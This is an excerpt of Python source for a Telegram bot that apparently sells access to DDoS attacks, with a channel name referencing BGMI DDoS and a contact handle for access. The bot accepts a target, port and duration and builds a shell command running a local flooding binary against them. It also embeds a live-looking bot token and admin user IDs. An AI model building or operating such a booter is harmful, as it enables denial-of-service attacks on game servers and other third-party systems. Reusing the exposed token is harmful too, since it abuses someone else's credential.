...
bot = telebot.TeleBot('7926759919:AAEl0Dcmb5y1HNphfntHSD36ANqTU6t5arI')

# Join :- https://t.me/freebgmiddos045 # Admin user IDs
admin_id = ["7031907806","1332157812"]
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # BY :- @MR_ADARSH_YT # Updated to accept target, time, and port
            ...
            if time > 240:
                ...
                full_command = f"./adarsh {target} {port} {time} 70"
...
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f''' ☑️ 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 𝙁𝙤𝙧 @MR_ADARSH_YTs 𝙏𝙤 𝙂𝙚𝙩 ??𝙘𝙘𝙚𝙨𝙨 🍾
'''
    bot.reply_to(message, response)
